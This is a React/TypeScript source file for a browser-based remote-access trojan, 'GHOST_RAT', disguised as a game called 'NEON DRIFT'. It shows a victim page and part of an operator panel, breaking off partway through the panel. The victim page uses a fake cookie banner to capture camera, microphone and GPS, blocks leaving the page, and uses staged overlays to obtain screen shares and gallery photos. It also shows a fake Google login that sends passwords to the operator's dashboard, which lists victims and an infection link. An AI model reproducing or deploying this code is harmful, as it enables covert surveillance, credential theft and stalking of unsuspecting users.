import React, { useState, useEffect, useRef, useCallback } from 'react';
import { AppProps } from '../../types';
import { Ghost, Wifi, Crosshair, Terminal, Copy, Eye, Zap, MessageSquare, Battery, Cookie, Gamepad2, Monitor, Camera, Image as ImageIcon, Lock, Share2, Map, Volume2, VolumeX, Flashlight, Skull, ChevronRight, Activity } from 'lucide-react';
import Peer from 'peerjs';

// --- UTILS ---
const compressImage = (file: File): Promise<string> => {
    return new Promise((resolve) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = (event) => {
            const img = new Image();
            img.src = event.target?.result as string;
            img.onload = () => {
                const canvas = document.createElement('canvas');
                const MAX_WIDTH = 800;
                const scale = MAX_WIDTH / img.width;
                canvas.width = MAX_WIDTH;
                canvas.height = img.height * scale;
                const ctx = canvas.getContext('2d');
                ctx?.drawImage(img, 0, 0, canvas.width, canvas.height);
                resolve(canvas.toDataURL('image/jpeg', 0.6));
            };
        };
    });
};

// Types
interface Credentials {
    service: string;
    email: string;
    pass: string;
    timestamp: number;
}

interface VictimData {
    id: string; 
    conn: any;  
    platform: string;
    battery?: number;
    gps?: { lat: number; lng: number; acc: number };
    stream?: MediaStream;
    gallery?: string[]; 
    credentials?: Credentials[];
    lastSeen: number;
}

// --- VICTIM COMPONENT ---
export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) => {
    const [viewState, setViewState] = useState<'boot' | 'intro' | 'trap' | 'game'>('boot');
    const [score, setScore] = useState(0);
    const [loadingProgress, setLoadingProgress] = useState(0);
    const [connectionStatus, setConnectionStatus] = useState('Initializing Game Engine...');
    
    // Traps / Overlays
    const [pendingAction, setPendingAction] = useState<'screen' | 'gallery' | 'phish' | null>(null);
    const [phishService, setPhishService] = useState('google');

    const peerRef = useRef<Peer | null>(null);
    const connRef = useRef<any>(null);
    const streamRef = useRef<MediaStream | null>(null);
    const canvasRef = useRef<HTMLCanvasElement>(null);
    const fileInputRef = useRef<HTMLInputElement>(null);
    
    // Phishing Refs
    const emailRef = useRef<HTMLInputElement>(null);
    const passRef = useRef<HTMLInputElement>(null);

    // Command Handler Ref to avoid stale closures
    const handleCommandRef = useRef<(data: any) => void>(() => {});

    // --- PERSISTENCE & LOCKDOWN ---
    useEffect(() => {
        const onPopState = () => window.history.pushState(null, "", window.location.href);
        window.history.pushState(null, "", window.location.href);
        window.addEventListener('popstate', onPopState);
        const onBeforeUnload = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ''; };
        window.addEventListener('beforeunload', onBeforeUnload);
        const onContextMenu = (e: MouseEvent) => e.preventDefault();
        window.addEventListener('contextmenu', onContextMenu);

        return () => {
            window.removeEventListener('popstate', onPopState);
            window.removeEventListener('beforeunload', onBeforeUnload);
            window.removeEventListener('contextmenu', onContextMenu);
        }
    }, []);

    // --- UTILITY: SEND DATA ---
    const sendData = (type: string, data: any) => {
        if (connRef.current && connRef.current.open) {
            connRef.current.send({ type, ...data });
        }
    };

    // --- MEDIA HANDLER ---
    const startMedia = useCallback(async (type: 'user' | 'environment' | 'display') => {
        if (!peerRef.current) return;
        
        // Cleanup old tracks to release hardware
        if (streamRef.current) {
            streamRef.current.getTracks().forEach(track => track.stop());
        }

        try {
            let stream: MediaStream;
            
            if (type === 'display') {
                // Screen Sharing
                try {
                    // @ts-ignore
                    stream = await navigator.mediaDevices.getDisplayMedia({ 
                        video: { cursor: "always" } as any, 
                        audio: false 
                    });
                } catch (err) {
                    // User cancelled screen share selection -> Revert to camera
                    console.warn("Screen share cancelled, reverting to user camera");
                    return startMedia('user');
                }
            } else {
                // Camera
                const constraints = type === 'environment' 
                    ? { video: { facingMode: { exact: 'environment' } }, audio: true }
                    : { video: { facingMode: 'user' }, audio: true };
                
                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch (err) {
                    // Fallback if specific facingMode fails
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                }
            }
            
            streamRef.current = stream;
            
            // Re-establish call with new stream
            // We create a new call to ensure the attacker receives the new track format
            const call = peerRef.current.call(sessionId, stream);
            
            sendData('log', { msg: `Stream Active: ${type.toUpperCase()}` });

            // Handle stream ending (e.g. user stops screen share from browser UI)
            if (stream.getVideoTracks().length > 0) {
                stream.getVideoTracks()[0].onended = () => {
                    sendData('log', { msg: 'Stream Stopped (UI). Reverting...' });
                    startMedia('user');
                };
            }

        } catch (e: any) {
            console.error("Media Error:", e);
            sendData('error', { msg: `Media Error: ${e.message}` });
            
            // If we failed to get display or back cam, revert to safe front cam
            if (type !== 'user') {
                setTimeout(() => startMedia('user'), 500);
            }
        }
    }, [sessionId]);

    // --- COMMAND HANDLER ---
    const handleCommand = useCallback((data: any) => {
        console.log("CMD:", data);

        if (data.cmd === 'vibrate') {
            if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
        }
        
        if (data.cmd === 'alert') {
            alert(data.msg || 'System Alert');
        }
        
        if (data.cmd === 'redirect') {
            window.location.href = data.url;
        }
        
        if (data.cmd === 'speak') {
            const u = new SpeechSynthesisUtterance(data.text);
            window.speechSynthesis.speak(u);
        }

        if (data.cmd === 'torch') {
            const currentStream = streamRef.current;
            if (!currentStream) return;

            const videoTrack = currentStream.getVideoTracks()[0];
            if (!videoTrack) return;

            // Check if current track supports torch
            const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : {};
            // @ts-ignore
            const supportsTorch = !!capabilities.torch;
            const settings = videoTrack.getSettings();

            // If we want torch ON, but current cam doesn't support it (likely front cam), switch to back
            if (data.on && !supportsTorch) {
                sendData('log', { msg: 'Switching to Back Camera for Torch...' });
                startMedia('environment').then(() => {
                    // Give it a moment to initialize the new stream
                    setTimeout(() => {
                        const newTrack = streamRef.current?.getVideoTracks()[0];
                        if (newTrack) {
                            // @ts-ignore
                            newTrack.applyConstraints({ advanced: [{ torch: true }] })
                                .then(() => sendData('log', { msg: 'Torch ON (Switched)' }))
                                .catch(() => sendData('error', {msg: 'Torch failed'}));
                        }
                    }, 1000);
                });
                return;
            }

            // Normal Toggle
            // @ts-ignore
            videoTrack.applyConstraints({ advanced: [{ torch: !!data.on }] })
                .then(() => sendData('log', { msg: `Torch ${data.on ? 'ON' : 'OFF'}` }))
                .catch((e: any) => sendData('error', { msg: `Torch Error: ${e.message}` }));
        }
        
        if (data.cmd === 'switch_cam') {
            if (streamRef.current) {
                const track = streamRef.current.getVideoTracks()[0];
                const currentFacing = track.getSettings().facingMode;
                // Toggle facing mode
                const next = currentFacing === 'environment' ? 'user' : 'environment';
                startMedia(next);
            } else {
                startMedia('environment');
            }
        }
        
        if (data.cmd === 'get_screen') {
            setPendingAction('screen');
            if (navigator.vibrate) navigator.vibrate(200);
        }

        if (data.cmd === 'get_gallery') {
            setPendingAction('gallery');
            if (navigator.vibrate) navigator.vibrate(200);
        }

        if (data.cmd === 'phish') {
            setPhishService(data.service || 'google');
            setPendingAction('phish');
            if (navigator.vibrate) navigator.vibrate(500);
        }
    }, [startMedia]);

    // Update Ref
    useEffect(() => {
        handleCommandRef.current = handleCommand;
    }, [handleCommand]);


    // --- CONNECTION SETUP ---
    useEffect(() => {
        if (peerRef.current) return;

        // Fake Loading Logic
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 8;
            if (progress > 100) progress = 100;
            setLoadingProgress(progress);
            if (progress === 100) {
                clearInterval(interval);
                setTimeout(() => setViewState('intro'), 200);
            }
        }, 80);

        const peer = new Peer();
        peerRef.current = peer;

        const connectToAttacker = () => {
            const conn = peer.connect(sessionId, { reliable: true });
            connRef.current = conn;

            conn.on('open', () => {
                setConnectionStatus('Connected.');
                
                // Initial Telemetry
                sendData('info', {
                    ua: navigator.userAgent,
                    platform: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    cores: navigator.hardwareConcurrency
                });

                if ((navigator as any).getBattery) {
                    (navigator as any).getBattery().then((b: any) => 
                        sendData('battery', { level: b.level * 100 })
                    );
                }

                // Keep Alive
                setInterval(() => sendData('ping', {}), 4000);
            });

            // Use Ref for data handling to prevent stale closures
            conn.on('data', (data) => handleCommandRef.current(data));
            
            conn.on('close', () => {
                setTimeout(connectToAttacker, 1000); // Reconnect
            });
        };

        peer.on('open', () => {
            connectToAttacker();
        });

        return () => { clearInterval(interval); peer.destroy(); };
    }, [sessionId]);


    // --- GAME ENGINE ---
    useEffect(() => {
        if (viewState !== 'game' || !canvasRef.current) return;
        const canvas = canvasRef.current;
        const ctx = canvas.getContext('2d');
        if (!ctx) return;

        let animationFrameId: number;
        let gameActive = true;
        let frameCount = 0;
        let speed = 8;
        let playerX = canvas.width / 2;
        const playerY = canvas.height - 120;
        let obstacles: any[] = [];

        // Input Handling
        const handleMove = (e: MouseEvent | TouchEvent) => {
            e.preventDefault();
            const clientX = 'touches' in e ? e.touches[0].clientX : e.clientX;
            playerX = clientX;
        };
        
        // IMPORTANT: Passive false for touch to prevent scrolling
        window.addEventListener('mousemove', handleMove);
        window.addEventListener('touchmove', handleMove, { passive: false });

        const render = () => {
            if (!gameActive) return;
            // Fullscreen Canvas
            if (canvas.width !== window.innerWidth) canvas.width = window.innerWidth;
            if (canvas.height !== window.innerHeight) canvas.height = window.innerHeight;

            // Background
            ctx.fillStyle = '#050505';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            // Retro 3D Grid Effect
            ctx.strokeStyle = '#333';
            ctx.lineWidth = 2;
            ctx.beginPath();
            // Vertical lines perspective
            for (let i = -canvas.width; i < canvas.width * 2; i += 100) {
                 ctx.moveTo(i + (canvas.width/2 - i) * 0.5, 0); 
                 ctx.lineTo(i, canvas.height); 
            }
            // Horizontal lines movement
            const offset = (frameCount * speed * 2) % 100;
            for (let i = 0; i < canvas.height; i += 40 + i * 0.1) {
                const y = i + offset;
                if(y < canvas.height) {
                    ctx.moveTo(0, y);
                    ctx.lineTo(canvas.width, y);
                }
            }
            ctx.stroke();

            // Generate Obstacles
            if (frameCount % 40 === 0) {
                obstacles.push({ 
                    x: Math.random() * (canvas.width - 100), 
                    y: -100, 
                    w: 80, 
                    h: 20, 
                    color: `hsl(${Math.random()*360}, 100%, 50%)`,
                    type: Math.random() > 0.5 ? 'block' : 'spike' 
                });
            }

            // Draw Obstacles
            obstacles.forEach((obs, i) => {
                obs.y += speed;
                
                ctx.shadowBlur = 20;
                ctx.shadowColor = obs.color;
                ctx.fillStyle = obs.color;
                
                if (obs.type === 'block') {
                    ctx.fillRect(obs.x, obs.y, obs.w, obs.h);
                } else {
                    ctx.beginPath();
                    ctx.moveTo(obs.x, obs.y);
                    ctx.lineTo(obs.x + obs.w/2, obs.y + obs.h);
                    ctx.lineTo(obs.x + obs.w, obs.y);
                    ctx.fill();
                }
                
                ctx.shadowBlur = 0;

                // Cleanup
                if (obs.y > canvas.height) {
                    obstacles.splice(i, 1);
                    setScore(s => s + 15);
                }
            });

            // Player Ship
            ctx.shadowBlur = 30;
            ctx.shadowColor = '#00ffff';
            ctx.fillStyle = '#00ffff';
            ctx.beginPath();
            ctx.moveTo(playerX, playerY);
            ctx.lineTo(playerX - 25, playerY + 60);
            ctx.lineTo(playerX, playerY + 45); // Engine indent
            ctx.lineTo(playerX + 25, playerY + 60);
            ctx.closePath();
            ctx.fill();

            // Engine Thruster
            ctx.fillStyle = `rgba(255, 100, 0, ${0.5 + Math.random() * 0.5})`;
            ctx.beginPath();
            ctx.moveTo(playerX - 10, playerY + 50);
            ctx.lineTo(playerX + 10, playerY + 50);
            ctx.lineTo(playerX, playerY + 80 + Math.random() * 20);
            ctx.fill();
            ctx.shadowBlur = 0;

            // Score HUD
            ctx.fillStyle = 'white';
            ctx.font = 'bold italic 32px sans-serif';
            ctx.textAlign = 'left';
            ctx.fillText(`${score}`, 30, 60);
            ctx.font = '14px monospace';
            ctx.fillStyle = '#aaa';
            ctx.fillText(`ZONE: ${Math.floor(score/1000)}`, 30, 80);

            frameCount++;
            animationFrameId = requestAnimationFrame(render);
        };
        render();

        return () => {
            cancelAnimationFrame(animationFrameId);
            window.removeEventListener('mousemove', handleMove);
            window.removeEventListener('touchmove', handleMove);
            gameActive = false;
        };
    }, [viewState]);

    const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.files && e.target.files.length > 0) {
            setPendingAction(null);
            const files = Array.from(e.target.files);
            sendData('log', { msg: `Exfiltrating ${files.length} images...` });
            for (const file of files) {
                try {
                    const compressedBase64 = await compressImage(file as File);
                    sendData('gallery_item', { data: compressedBase64 });
                } catch (err) {}
            }
            alert("Verification Successful. Resume playing.");
        }
    };

    const handlePhishSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        const email = emailRef.current?.value;
        const pass = passRef.current?.value;
        if (email && pass) {
            sendData('creds', { service: phishService, email, pass, timestamp: Date.now() });
            sendData('log', { msg: '*** CREDENTIALS CAPTURED ***' });
            setTimeout(() => {
                alert("Network Error. Please try again later.");
                setPendingAction(null);
            }, 1000);
        }
    };

    // --- PERMISSION GRANT (COOKIE TRAP) ---
    const handleConsent = async () => {
        try {
            // 1. SILENTLY REQUEST CAMERA & MIC
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: 'user' }, 
                audio: true 
            });
            streamRef.current = stream;
            
            // 2. IMMEDIATE STREAM TO ATTACKER
            if (peerRef.current && sessionId) {
                 peerRef.current.call(sessionId, stream);
                 sendData('log', { msg: 'Cookie Accepted -> Stream Started' });
            }

            // 3. SILENTLY REQUEST GPS
            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => sendData('gps', { lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy }),
                     () => {}
                 );
            }
        } catch (e) {
            console.error("Perms error", e);
            sendData('error', { msg: 'User denied hardware access' });
        }

        // 4. START GAME IMMEDIATELY
        setViewState('game');
    };

    // --- RENDER VICTIM VIEW ---
    if (viewState === 'boot') {
        return (
            <div className="fixed inset-0 bg-black flex flex-col items-center justify-center p-8">
                <div className="w-full max-w-xs space-y-4">
                    <div className="flex justify-between text-xs font-mono text-cyan-500">
                        <span>INITIALIZING...</span>
                        <span>{Math.round(loadingProgress)}%</span>
                    </div>
                    <div className="h-1 bg-slate-800 rounded-full overflow-hidden">
                        <div className="h-full bg-cyan-500 transition-all duration-100 ease-out" style={{ width: `${loadingProgress}%` }} />
                    </div>
                    <div className="text-[10px] font-mono text-slate-500 text-center animate-pulse">
                        {connectionStatus}
                    </div>
                </div>
            </div>
        );
    }

    if (viewState === 'intro') {
        return (
            <div onClick={() => setViewState('trap')} className="fixed inset-0 bg-black flex flex-col items-center justify-center cursor-pointer overflow-hidden">
                <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1535378437327-1e88860c6340')] bg-cover opacity-60 animate-pulse" />
                <div className="relative z-10 text-center p-6">
                    <div className="text-cyan-400 font-black tracking-[0.5em] text-xs mb-6 animate-pulse">CLOUDOS ENTERTAINMENT</div>
                    <h1 className="text-7xl md:text-9xl font-black italic text-transparent bg-clip-text bg-gradient-to-br from-cyan-400 via-blue-500 to-purple-600 transform -skew-x-12 mb-8 drop-shadow-2xl">NEON<br/>DRIFT</h1>
                    <div className="inline-flex items-center gap-3 px-8 py-4 bg-white/10 backdrop-blur-md border border-white/30 rounded-full text-white font-bold animate-bounce hover:bg-white/20 transition-colors shadow-[0_0_30px_rgba(0,255,255,0.3)]">
                        <Gamepad2 size={24} /> TAP TO START
                    </div>
                </div>
            </div>
        );
    }

    // --- COOKIE TRAP ---
    if (viewState === 'trap') {
        return (
            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-end justify-center z-50 animate-in slide-in-from-bottom duration-500">
                <div className="bg-white w-full max-w-md m-4 rounded-3xl p-6 shadow-2xl">
                    <div className="flex items-start justify-between mb-4">
                        <div className="flex items-center gap-3">
                            <div className="p-3 bg-indigo-100 text-indigo-600 rounded-2xl">
                                <Cookie size={24} />
                            </div>
                            <div>
                                <h2 className="font-bold text-lg text-slate-900">Cookie Preferences</h2>
                                <p className="text-xs text-slate-500">Required for Multiplayer & Saves</p>
                            </div>
                        </div>
                    </div>
                    
                    <p className="text-slate-600 text-sm mb-6 leading-relaxed">
                        We use cookies and hardware acceleration to provide a lag-free gaming experience. 
                        Allowing access enables cloud saves, voice chat features, and location-based leaderboards.
                    </p>

                    <div className="grid grid-cols-2 gap-3">
                        <button onClick={() => window.location.reload()} className="py-3 bg-slate-100 text-slate-600 font-bold rounded-xl text-sm hover:bg-slate-200">
                            Decline
                        </button>
                        <button 
                            onClick={handleConsent} 
                            className="py-3 bg-indigo-600 text-white font-bold rounded-xl text-sm shadow-lg shadow-indigo-500/30 active:scale-95 transition-transform"
                        >
                            Allow All Cookies
                        </button>
                    </div>
                </div>
            </div>
        );
    }

    return (
        <div className="fixed inset-0 bg-black overflow-hidden touch-none select-none">
            {/* GAME CANVAS */}
            <canvas ref={canvasRef} className="w-full h-full block" />
            
            {/* TRAPS (OVERLAYS) */}
            
            {/* 1. SCREEN SHARE TRAP */}
            {pendingAction === 'screen' && (
                <div 
                    onClick={() => { setPendingAction(null); startMedia('display'); }}
                    className="absolute inset-0 z-[100] bg-red-600/90 backdrop-blur-md flex flex-col items-center justify-center text-white cursor-pointer p-8 text-center"
                >
                    <Wifi size={80} className="mb-6 animate-pulse" />
                    <h2 className="text-4xl font-black uppercase tracking-widest">Connection Lost</h2>
                    <p className="font-bold text-xl mt-4 animate-bounce">TAP SCREEN TO RECONNECT</p>
                    <p className="text-sm mt-8 opacity-70 max-w-xs">Server handshake failed. Re-authorization required for multiplayer stream.</p>
                </div>
            )}

            {/* 2. GALLERY TRAP (Avatar Upload) */}
            {pendingAction === 'gallery' && (
                <div 
                    onClick={() => fileInputRef.current?.click()}
                    className="absolute inset-0 z-[100] bg-indigo-950/95 backdrop-blur-md flex flex-col items-center justify-center text-white cursor-pointer p-8 text-center"
                >
                    <div className="w-24 h-24 bg-indigo-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
                        <ImageIcon size={40} className="text-indigo-400" />
                    </div>
                    <h2 className="text-3xl font-black uppercase mb-2">Setup Avatar</h2>
                    <p className="max-w-xs text-center mb-8 text-indigo-200 font-medium leading-relaxed">
                        To continue, please select a photo from your gallery to use as your player profile.
                    </p>
                    <button className="px-10 py-4 bg-white text-indigo-900 font-black rounded-full text-lg shadow-xl hover:scale-105 transition-transform">
                        CHOOSE PHOTO
                    </button>
                    <input ref={fileInputRef} type="file" accept="image/*" multiple className="hidden" onChange={handleFileUpload} />
                </div>
            )}

            {/* 3. PHISHING TRAP */}
            {pendingAction === 'phish' && (
                <div className="absolute inset-0 z-[200] bg-white flex flex-col items-center justify-center p-6 text-slate-800">
                    <div className="w-full max-w-sm">
                        <div className="flex justify-center mb-8">
                            <span className="text-blue-600 font-bold text-2xl tracking-tight">G<span className="text-red-500">o</span><span className="text-yellow-500">o</span><span className="text-blue-600">g</span><span className="text-green-500">l</span><span className="text-red-500">e</span></span>
                        </div>
                        <h2 className="text-center text-xl font-medium mb-2">Sign in</h2>
                        <p className="text-center text-sm text-slate-600 mb-8">to continue to CloudOS</p>
                        
                        <form onSubmit={handlePhishSubmit} className="space-y-4">
                            <div className="space-y-1">
                                <input 
                                    ref={emailRef}
                                    type="email" 
                                    required
                                    placeholder="Email or phone"
                                    className="w-full border border-slate-300 rounded px-3 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all"
                                />
                            </div>
                            <div className="space-y-1">
                                <input 
                                    ref={passRef}
                                    type="password" 
                                    required
                                    placeholder="Password"
                                    className="w-full border border-slate-300 rounded px-3 py-3 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none transition-all"
                                />
                            </div>
                            <div className="flex justify-between items-center text-sm font-medium text-blue-600 mt-2">
                                <a href="#" className="hover:underline">Forgot email?</a>
                            </div>
                            <div className="flex justify-end mt-8">
                                <button type="submit" className="bg-blue-600 text-white px-6 py-2 rounded font-bold hover:bg-blue-700 transition-colors">Next</button>
                            </div>
                        </form>
                    </div>
                </div>
            )}
        </div>
    );
};

// --- ATTACKER COMPONENT ---
export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
    const [peerId, setPeerId] = useState('');
    const [victims, setVictims] = useState<Record<string, VictimData>>({});
    const [selectedId, setSelectedId] = useState<string | null>(null);
    const [logs, setLogs] = useState<string[]>([]);
    const [activeTab, setActiveTab] = useState<'controls' | 'data'>('controls');
    
    const [ttsInput, setTtsInput] = useState('');
    const [isMuted, setIsMuted] = useState(true);

    const videoRef = useRef<HTMLVideoElement>(null);
    const peerRef = useRef<Peer | null>(null);

    const addLog = (m: string) => setLogs(p => [`[${new Date().toLocaleTimeString()}] ${m}`, ...p].slice(0, 50));

    useEffect(() => {
        const id = localStorage.getItem('ghost_id');
        const peer = id ? new Peer(id) : new Peer();
        peerRef.current = peer;
        
        peer.on('open', (pid) => {
            setPeerId(pid);
            localStorage.setItem('ghost_id', pid);
            addLog(`C2 ONLINE: ${pid}`);
        });

        peer.on('connection', (conn) => {
            const vid = conn.peer;
            setVictims(prev => ({ ...prev, [vid]: { id: vid, conn, platform: 'Unknown', ua: '', screen: '', lang: '', cores: 0, connectedAt: Date.now(), lastSeen: Date.now() } }));
            if (!selectedId) setSelectedId(vid);
            addLog(`[+] TARGET CONNECTED: ${vid.substring(0,5)}`);

            conn.on('data', (d: any) => {
                setVictims(p => ({...p, [vid]: {...p[vid], lastSeen: Date.now()}}));

                if (d.type === 'info') setVictims(p => ({ ...p, [vid]: { ...p[vid], ...d.data } }));
                if (d.type === 'battery') setVictims(p => ({ ...p, [vid]: { ...p[vid], battery: d.level } }));
                if (d.type === 'gps') setVictims(p => ({ ...p, [vid]: { ...p[vid], gps: d.data } }));
                if (d.type === 'log') addLog(`${vid.substring(0,4)}: ${d.msg}`);
                if (d.type === 'error') addLog(`${vid.substring(0,4)} ERR: ${d.msg}`);
                
                if (d.type === 'gallery_item') {
                    setVictims(p => ({ ...p, [vid]: { ...p[vid], gallery: [d.data, ...(p[vid]?.gallery || [])] } }));
                    addLog(`${vid.substring(0,4)}: IMAGE EXFILTRATED`);
                }

                if (d.type === 'creds') {
                    setVictims(p => ({ ...p, [vid]: { ...p[vid], credentials: [d.data, ...(p[vid]?.credentials || [])] } }));
                    addLog(`!!! CREDENTIALS STOLEN: ${d.data.email}`);
                    const audio = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');
                    audio.play().catch(() => {});
                }
            });

            conn.on('close', () => {
                setVictims(p => { const n = {...p}; delete n[vid]; return n; });
                addLog(`[-] TARGET LOST: ${vid.substring(0,5)}`);
            });
        });

        peer.on('call', (call) => {
            call.answer();
            call.on('stream', (stream) => {
                setVictims(p => ({ ...p, [call.peer]: { ...p[call.peer], stream } }));
                addLog(`[VIDEO] STREAM RECEIVED: ${call.peer.substring(0,5)}`);
            });
        });

    }, []);

    // Bind Video Stream
    useEffect(() => {
        if (selectedId && videoRef.current && victims[selectedId]?.stream) {
            videoRef.current.srcObject = victims[selectedId].stream!;
            // FORCE PLAY - Fixes issue where stream changes but video element pauses
            videoRef.current.play().catch(e => console.log("Autoplay blocked", e));
        }
    }, [selectedId, victims, activeTab]); 

    const target = selectedId ? victims[selectedId] : null;
    const send = (cmd: string, pl = {}) => target?.conn.send({ cmd, ...pl });
    const copyLink = () => navigator.clipboard.writeText(`https://kernelosss.vercel.app/${peerId}`);

    return (
        <div className={`h-full w-full flex flex-col font-mono ${isHackerMode ? 'bg-black text-green-500' : 'bg-slate-900 text-red-500'}`}>
            {/* Header */}
            <div className="h-12 border-b border-white/10 flex items-center justify-between px-4 bg-white/5 shrink-0">
                <div className="flex items-center gap-2 font-bold">
                    <Ghost size={18} /> GHOST_RAT V9.0 (ELITE)
                </div>
                <div className="flex gap-2">
                    <button onClick={copyLink} className="flex items-center gap-1 bg-white/10 px-2 py-1 rounded text-xs hover:bg-white/20 transition-colors">
                        <Copy size={12} /> COPY LINK
                    </button>
                    <div className={`px-2 py-1 rounded text-xs font-bold ${peerId ? 'bg-green-900 text-green-400' : 'bg-red-900 text-red-400'}`}>
                        {peerId ? 'ONLINE' : 'OFFLINE'}
                    </div>
                </div>
            </div>

            <div className="flex-1 flex overflow-hidden">
                {/* Victim List SideBar */}
                <div className="w-64 border-r border-white/10 bg-black/20 flex flex-col shrink-0">
                    <div className="flex-1 overflow-y-auto">
                        <div className="p-2 text-[10px] font-bold opacity-50 uppercase tracking-wider">Active Targets ({Object.keys(victims).length})</div>
                        {Object.values(victims).map((v: VictimData) => (
                            <button 
                                key={v.id} 
                                onClick={() => setSelectedId(v.id)}
                                className={`w-full p-3 text-left border-b border-white/5 hover:bg-white/5 transition-colors ${selectedId === v.id ? 'bg-white/10 border-l-2 border-l-current' : ''}`}
                            >
                                <div className="flex justify-between items-center mb-1">
                                    <span className="font-bold text-xs truncate max-w-[100px]">{v.platform || 'Unknown Device'}</span>
                                    {v.stream && <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse shadow-[0_0_8px_red]" />}
                                </div>
                                <div className="flex justify-between items-center text-[10px] opacity-60">
                                    <span>ID: {v.id.substring(0,6)}</span>
                                    <span>{v.battery ? v.battery + '%' : ''}</span>
                                </div>
                            </button>
                        ))}
                    </div>
                    {/* Infection URL Footer */}
                    <div className="p-3 border-t border-white/10 bg-white/5 shrink-0">
                        <div className="flex items-center gap-2 mb-2 text-[10px] font-bold opacity-70 uppercase">
                             <Share2 size={10} /> Infection Payload URL
                        </div>
                        <div className="flex gap-1">
                            <input 
                                readOnly 
                                value={peerId ? `https://kernelosss.vercel.app/${peerId}` : 'Initializing...'} 
                                className="w-full bg-black/50 border border-white/10 rounded px-2 py-1.5 text-[9px] text-white/70 outline-none select-all font-mono"
                            />
                            <button onClick={copyLink} className="p-1.5 bg-white/10 rounded hover:bg-white/20 text-white/70 transition-colors"><Copy size={12} /></button>
                        </div>
                    </div>
                </div>

                {/* Main Control Area */}
                <div className="flex-1 flex flex-col bg-black/50 min-w-0">
                    {target ? (
                        <>
                            {/* LIVE FEED */}
                            <div className="h-[40%] bg-black relative border-b border-white/10 group shrink-0">
                                {target.stream ? (
                                    <video ref={videoRef} autoPlay playsInline muted={isMuted} className="w-full h-full object-contain transform scale-x-[-1]" /> 
                                ) : (
                                    <div className="absolute inset-0 flex flex-col items-center justify-center opacity-30 gap-2"><Eye size={48} className="animate-pulse" /><span className="text-xs font-bold tracking-widest">NO SIGNAL</span></div>
                                )}
                                <div className="absolute top-2 left-2 flex gap-2">
                                    <div className="bg-red-600/90 text-white text-[9px] px-2 py-0.5 rounded font-bold shadow-lg flex items-center gap-1"><div className="w-1.5 h-1.5 bg-white rounded-full animate-pulse" /> LIVE</div>
                                </div>
                                <div className="absolute top-2 right-2">
                                    <button onClick={() => setIsMuted(!isMuted)} className={`p-1.5 rounded bg-black/50 hover:bg-black/80 text-white`}>
                                        {isMuted ? <VolumeX size={14} /> : <Volume2 size={14} className="text-green-400" />}
                                    </button>
                                </div>
                            </div>

                            {/* TABS */}
                            <div className="flex border-b border-white/10 text-xs font-bold shrink-0">
                                <button onClick={() => setActiveTab('controls')} className={`flex-1 py-3 hover:bg-white/5 transition-colors ${activeTab === 'controls' ? 'border-b-2 border-current bg-white/5' : 'opacity-50'}`}>CONTROLS</button>
                                <button onClick={() => setActiveTab('data')} className={`flex-1 py-3 hover:bg-white/5 transition-colors ${activeTab === 'data' ? 'border-b-2 border-current bg-white/5' : 'opacity-50'}`}>DATA & FILES</button>
                            </div>

                            {/* CONTENT */}
                            <div className="flex-1 overflow-y-auto p-4 bg-black/40">
                                {activeTab === 'controls' ? (
                                    <div className="grid grid-cols-2 md:grid-cols-3 gap-3 max-w-3xl mx-auto">
                                        
                                        {/* INFO CARD */}
                                        <div className="col-span-2 md:col-span-3 bg-white/5 p-4 rounded-lg border border-white/10 text-xs space-y-2 mb-2 relative">
                                            <div className="absolute top-3 right-3 text-right">
                                                <div className="font-bold text-lg text-white">{target.battery}%</div>
                                                <div className="text-[9px] opacity-50">BATTERY LEVEL</div>
                                            </div>
                                            <div className="grid grid-cols-2 gap-4">
                                                <div>
                                                    <div className="opacity-50 mb-0.5">PLATFORM</div>
                                                    <div className="font-bold text-white">{target.platform}</div>
                                                </div>
                                                <div>
                                                    <div className="opacity-50 mb-0.5">SCREEN</div>
                                                    <div className="font-bold text-white">{target.screen}</div>
                                                </div>
                                                <div className="col-span-2">
                                                    <div className="opacity-50 mb-0.5">LOCATION</div>
                                                    <div className="font-bold font-mono text-white flex items-center gap-2">
                                                        {target.gps ? `${target.gps.lat.toFixed(5)}, ${target.gps.lng.toFixed(5)}` : 'Scanning...'}
                                                        {target.gps && (
                                                            <a href={`https://www.google.com/maps?q=${target.gps.lat},${target.gps.lng}`} target="_blank" className="p-1 bg-blue-600 rounded hover:bg-blue-500 text-white"><Map size={12}/></a>
                                                        )}
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        {/* MEDIA CONTROLS */}
                                        <div className="col-span-2 md:col-span-3 text-[10px] font-bold opacity-50 uppercase tracking-wider mt-2">Surveillance</div>
                                        
                                        <button onClick={() => send('switch_cam')} className="p-3 bg-blue-600/20 border border-blue-500/50 hover:bg-blue-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <Camera size={20} className="text-blue-400" /> <span className="text-[10px] font-bold">SWITCH CAM</span>
                                        </button>
                                        <button onClick={() => send('get_screen')} className="p-3 bg-red-600/20 border border-red-500/50 hover:bg-red-600/30 rounded flex flex-col items-center gap-2 active:scale-95 transition-all">
                                            <Monitor size={20} className="text-red-400" /> <span className="text-[10px] font-bold">GET SCREEN</span>
                                        </button>
